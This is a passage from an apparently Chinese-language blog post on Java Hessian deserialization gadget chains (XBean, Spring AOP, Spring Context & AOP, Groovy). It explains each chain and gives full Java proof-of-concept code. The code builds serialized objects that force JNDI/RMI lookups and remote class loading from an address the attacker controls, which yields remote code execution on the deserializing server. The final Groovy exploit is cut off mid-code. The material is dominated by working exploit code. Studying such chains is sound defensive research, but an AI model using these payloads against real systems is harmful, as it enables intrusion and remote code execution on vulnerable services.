class="language-none"><code class="language-none">NamingManager.getObjectFactoryFromReference() (javax.naming.spi)NamingManager.getObjectInstance() (javax.naming.spi)ContextUtil.resolve()   (org.apache.xbean.naming.context)// 关键点ContextUtil$ReadOnlyBinding.getObject() (org.apache.xbean.naming.context)// 关键点Binding.toString() (com.caucho.naming)     // 关键点XString.equals() (com.sun.org.apache.xpath.internal.objects)HotSwappableTargetSource.equals()HashMap.putVal()HashMap.put()MapDeserializer.readMap()SerializerFactory.readMap()Hessian2Input.readObject()</code></pre><p>XBean 这条链几乎是与 Resin 一模一样，只不过是在 XBean 中找到了类似功能的实现。<br>首先还是用 XString 触发 ContextUtil.ReadOnlyBinding 的 toString 方法（实际继承 javax.naming.Binding），toString 方法调用 getObject 方法获取对象。<br><img src="/img/24-6-7/47.png"></p><p>调用 ContextUtil#resolve 方法。<br><img src="/img/24-6-7/48.png"><br>方法调用 NamingManager#getObjectInstance 方法，后续触发逻辑一致，从远程加载恶意类字节码。<br><img src="/img/24-6-7/49.png"><br>这里触发equals用HotSwappableTargetSource包装一下，也可以用上面的unhash方法<br>poc</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> addr<span class="token operator">=</span><span class="token string">"http://127.0.0.1:8085/"</span><span class="token punctuation">;</span><span class="token class-name">String</span> className<span class="token operator">=</span><span class="token string">"HVzHJCkI"</span><span class="token punctuation">;</span><span class="token class-name">Reference</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> className<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ContextUtil<span class="token punctuation">.</span>ReadOnlyBinding</span> readOnlyBinding <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ContextUtil<span class="token punctuation">.</span>ReadOnlyBinding</span><span class="token punctuation">(</span><span class="token string">"yyjccc"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">WritableContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">XString</span> x1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HotSwappableTargetSource</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span>readOnlyBinding<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HotSwappableTargetSource</span> h2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span><span class="token string">"yyj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>h2<span class="token punctuation">,</span><span class="token string">"ccc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>readOnlyBinding<span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">,</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> hashMap<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialize <span class="token operator">=</span> <span class="token class-name">HessianSerize</span><span class="token punctuation">.</span><span class="token function">serialize2</span><span class="token punctuation">(</span><span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HessianSerize</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="Spring-AOP"><a href="#Spring-AOP" class="headerlink" title="Spring AOP"></a>Spring AOP</h3><p>这条利用链也很简单，还是利用 HashMap 中put方法，若hashmap不为空，就会对比触发 equals 方法。<br><img src="/img/24-6-7/50.png"><br>核心是 AbstractPointcutAdvisor 和其子类 AbstractBeanFactoryPointcutAdvisor。<br>使用两个子类，都可以<br><img src="/img/24-6-7/51.png"><br>触发点在 AbstractPointcutAdvisor 的 equals 方法，对比两个 AbstractPointcutAdvisor 是否相同，就是在对比其 Pointcut 切点和 Advice 是否为同一个。<br><img src="/img/24-6-7/52.png"><br>其子类 AbstractBeanFactoryPointcutAdvisor 是和 BeanFactory 有关的 PointcutAdvisor，简单来说就是进行切片时可以使用 beanFactory 里面注册的实例。其 getAdvice 方法会调用其成员变量 beanFactory 的 getBean 方法获取 Bean 实例。<br><img src="/img/24-6-7/53.png"><br>这时只要结合 SimpleJndiBeanFactory 就可以触发 JNDI 查询。<br><img src="/img/24-6-7/54.png"><br>进入JndiTemplate#lookup中<br><img src="/img/24-6-7/55.png"><br>这里说明能够成功的进行jndi注入<br>在自己写这条链的时候，也是在不断的报错，因为发现它里面利用的很多类都没有继承Serializable接口，导致无法序列化和反序列化，并且似乎并没有找到绕过去的方式，包括SimpleJndiBeanFactory，后来才知道Hessian可以不需要继承序列化和反序列化的。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">serialize2</span><span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>      <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">HessianOutput</span> hessianOutput<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HessianOutput</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">SerializerFactory</span> serializerFactory<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SerializerFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//无需继承Serializable也可进行序列化和反序列化</span>      serializerFactory<span class="token punctuation">.</span><span class="token function">setAllowNonSerializable</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      hessianOutput<span class="token punctuation">.</span><span class="token function">setSerializerFactory</span><span class="token punctuation">(</span>serializerFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>      hessianOutput<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p><strong>poc</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token class-name">SpringAop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> jndi<span class="token operator">=</span><span class="token string">"rmi://127.0.0.1:8085/WhVCFlBv"</span><span class="token punctuation">;</span><span class="token class-name">SimpleJndiBeanFactory</span> simpleJndiBeanFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleJndiBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>simpleJndiBeanFactory<span class="token punctuation">.</span><span class="token function">setShareableResources</span><span class="token punctuation">(</span>jndi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DefaultBeanFactoryPointcutAdvisor</span> defaultAdvisor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultBeanFactoryPointcutAdvisor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>defaultAdvisor<span class="token punctuation">.</span><span class="token function">setAdviceBeanName</span><span class="token punctuation">(</span>jndi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">AbstractBeanFactoryPointcutAdvisor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>defaultAdvisor<span class="token punctuation">,</span><span class="token string">"beanFactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">SimpleJndiBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DefaultBeanFactoryPointcutAdvisor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>defaultAdvisor<span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>defaultAdvisor<span class="token punctuation">,</span>defaultAdvisor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">AbstractBeanFactoryPointcutAdvisor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>defaultAdvisor<span class="token punctuation">,</span><span class="token string">"beanFactory"</span><span class="token punctuation">,</span>simpleJndiBeanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> hashMap<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialize <span class="token operator">=</span> <span class="token class-name">HessianSerize</span><span class="token punctuation">.</span><span class="token function">serialize2</span><span class="token punctuation">(</span><span class="token class-name">SpringAop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> deserialize <span class="token operator">=</span> <span class="token class-name">HessianSerize</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="Spring-Context-AOP"><a href="#Spring-Context-AOP" class="headerlink" title="Spring Context &amp; AOP"></a>Spring Context &amp; AOP</h3><p>这条链的触发点在于 AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder 的 toString 方法，会打印 order 属性，调用 advisor 的 getOrder 方法。</p><p>这个感觉就是上条链子差不多的思路<br><img src="/img/24-6-7/56.png"><br>这里需要String方法，参考<a href="https://www.yuque.com/yyjccc/pk74ko/frdd2euxldnyzm5h">https://www.yuque.com/yyjccc/pk74ko/frdd2euxldnyzm5h</a><br>中的Xstring;XString的equal方法就会触发toString方法</p><p>此时就需要找到类同时实现了 Advisor 和 Ordered 接口，于是找到了 AspectJPointcutAdvisor ，这个类的 getOrder 方法调用 AbstractAspectJAdvice 的 getOrder 方法。<br><img src="/img/24-6-7/57.png"><br>又调用了 AspectInstanceFactory 的 getOrder 方法。<br><img src="/img/24-6-7/58.png"><br>继续找 AspectInstanceFactory 的子类看有没有可以触发的点，找到了 BeanFactoryAspectInstanceFactory，其 getOrder 方法调用 beanFactory 的 getType 方法。<br><img src="/img/24-6-7/59.png"><br>于是又掏出 SimpleJndiBeanFactory ，</p><img src="/img/24-6-7/60.png">他的的 doGetType 方法调用 doGetSingleton 方法执行 JNDI 查询，组成了完整的利用链。<img src="/img/24-6-7/61.png">在 marshalsec 封装对象时，使用了 HotSwappableTargetSource 封装类，其 equals 方法会调用其 target 的 equals 方法。其实并无必要，感觉是纯炫技写法。**poc**<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token class-name">AOPContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> jndiUrl <span class="token operator">=</span> <span class="token string">"rmi://127.0.0.1:8085/WhVCFlBv"</span><span class="token punctuation">;</span><span class="token class-name">SimpleJndiBeanFactory</span> simpleJndiBeanFactory<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SimpleJndiBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>simpleJndiBeanFactory<span class="token punctuation">.</span><span class="token function">setShareableResources</span><span class="token punctuation">(</span>jndiUrl<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AspectInstanceFactory</span> beanFactoryAspectInstanceFactory<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BeanFactoryAspectInstanceFactory</span><span class="token punctuation">(</span>simpleJndiBeanFactory<span class="token punctuation">,</span>jndiUrl<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AbstractAspectJAdvice</span> advice <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">AspectJAfterAdvice</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span></span>AbstractAspectJAdvice</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>advice<span class="token punctuation">,</span><span class="token string">"aspectInstanceFactory"</span><span class="token punctuation">,</span>beanFactoryAspectInstanceFactory<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AspectJPointcutAdvisor</span> aspectJPointcutAdvisor<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">AspectJPointcutAdvisor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>aspectJPointcutAdvisor<span class="token punctuation">,</span><span class="token string">"advice"</span><span class="token punctuation">,</span>advice<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> <span class="token class-name">Partially</span><span class="token operator">=</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Partially</span><span class="token punctuation">,</span><span class="token string">"advisor"</span><span class="token punctuation">,</span>aspectJPointcutAdvisor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HotSwappableTargetSource</span> hotSwappableTargetSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HotSwappableTargetSource</span> hotSwappableTargetSource1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>hotSwappableTargetSource<span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>hotSwappableTargetSource1<span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>hotSwappableTargetSource<span class="token punctuation">,</span><span class="token string">"target"</span><span class="token punctuation">,</span><span class="token class-name">Partially</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> hashMap<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialize <span class="token operator">=</span> <span class="token class-name">HessianSerize</span><span class="token punctuation">.</span><span class="token function">serialize2</span><span class="token punctuation">(</span><span class="token class-name">AOPContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> deserialize <span class="token operator">=</span> <span class="token class-name">HessianSerize</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>### Groovy参考：[Groovy](https://www.yuque.com/yyjccc/pk74ko/yl25n3uhcmu83smp?view=doc_embed)触发点使用了 TreeMap 触发 compareTo 方法，使用 ConvertedClosure 生成动态代理对象，将方法调用转移至 MethodClosure 封装类，借用其 doCall 方法进一步调用 ContinuationDirContext#listBindings 方法触发后续的攻击流程。<img src="/img/24-6-7/62.png">直接TreeMap#put会报错解决报错<img src="/img/24-6-7/63.png">就不能直接使用TreeMap#put了看看put方法是干了什么<img src="/img/24-6-7/64.png">跳过前面的代码，避免调用compare其实就是创建了TreeMap.Entry，然后挂入父节点已知TreeMap是二叉树，放入两个节点（两次put操作）放入第二个节点时候就会比较key，进行排序，那我们序列化的时候就直接排序好根节点就是普通数据，右节点放入要触发的对象<img src="/img/24-6-7/65.png">第三个参数是父节点（root节点，父节点为null）放入根节点<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">TreeMap</span> treeMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> e <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.TreeMap$Entry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> declaredConstructor <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>declaredConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> commonEntry <span class="token operator">=</span> declaredConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>treeMap<span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span>commonEntry<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>放入第二个节点<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> proxyMapEntry <span class="token operator">=</span> declaredConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>proxyMap<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> commonEntry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>treeMap<span class="token punctuation">,</span><span class="token string">"size"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>treeMap<span class="token punctuation">,</span><span class="token string">"modCount"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>poc</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjcccc<span class="token punctuation">.</span>hessianser<span class="token punctuation">.</span>gadget</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>exploit<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Reflect</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>yyjcccc<span class="token punctuation">.</span>hessianser<span class="token punctuation">.</span>usage<span class="token punctuation">.</span></span><span class="token class-name">HessianSerize</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">ConvertedClosure</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">MethodClosure</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">CannotProceedException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">TreeMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GroovyGadget</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span><span class="token class-name">String</span> addr<span class="token operator">=</span><span class="token string">"http://127.0.0.1:8085/"</span><span class="token punctuation">;</span><span class="token class-name">String</span> className<span class="token operator">=</span><span class="token string">"HVzHJCkI"</span><span class="token punctuation">;</span><span class="token class-name">Reference</span> ref<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span>className<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CannotProceedException</span> cpe <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CannotProceedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">NamingException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>cpe<span class="token punctuation">,</span><span class="token string">"resolvedObj"</span><span class="token punctuation">,</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> aClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.naming.spi.ContinuationContext"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> constructor <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">CannotProceedException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Hashtable</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token 